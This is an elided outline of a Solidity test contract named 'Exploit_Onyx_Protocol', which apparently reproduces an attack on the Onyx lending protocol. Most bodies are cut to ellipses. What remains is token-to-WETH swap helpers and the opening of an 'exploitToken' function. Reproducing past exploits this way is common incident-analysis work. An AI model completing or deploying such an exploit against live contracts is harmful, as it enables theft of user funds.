...
contract Exploit_Onyx_Protocol is TestHarness, TokenBalanceTracker {
    ...
    function swapWethToPepe(uint256 _amountOut) internal {
    ...
    function swapUsdcToWeth(uint256 _amountOut) internal {
        address[] memory path = new address[](2);
        path[0] = address(USDC);
        path[1] = address(WETH);
        Router.swapExactTokensForTokens(
    ...
    function swapUsdtToWeth(uint256 _amountOut) internal {
        address[] memory path = new address[](2);
        path[0] = address(USDT);
        path[1] = address(WETH);
        Router.swapExactTokensForTokens(
    ...
    function swapPaxgToWeth(uint256 _amountOut) internal {
        address[] memory path = new address[](2);
        path[0] = address(PAXG);
        path[1] = address(WETH);
    ...
    function swapDaiToWeth(uint256 _amountOut) internal {
        address[] memory path = new address[](2);
        path[0] = address(DAI);
        path[1] = address(WETH);
        Router.swapExactTokensForTokens(
    ...
    function swapWbtcToWeth(uint256 _amountOut) internal {
        address[] memory path = new address[](2);
        path[0] = address(WBTC);
        path[1] = address(WETH);
        Router.swapExactTokensForTokens(
    ...
    function swapLinkToWeth(uint256 _amountOut) internal {
        address[] memory path = new address[](2);
        path[0] = address(LINK);
        path[1] = address(WETH);
        Router.swapExactTokensForTokens(
    ...
    function calcAmountOut(uint112 reserve1, uint112 reserve2, uint256 tokenBalance)
        internal
        pure
        returns (uint256)
    {
    ...
    function exploitToken(ICERC20Delegator onyxToken) internal {
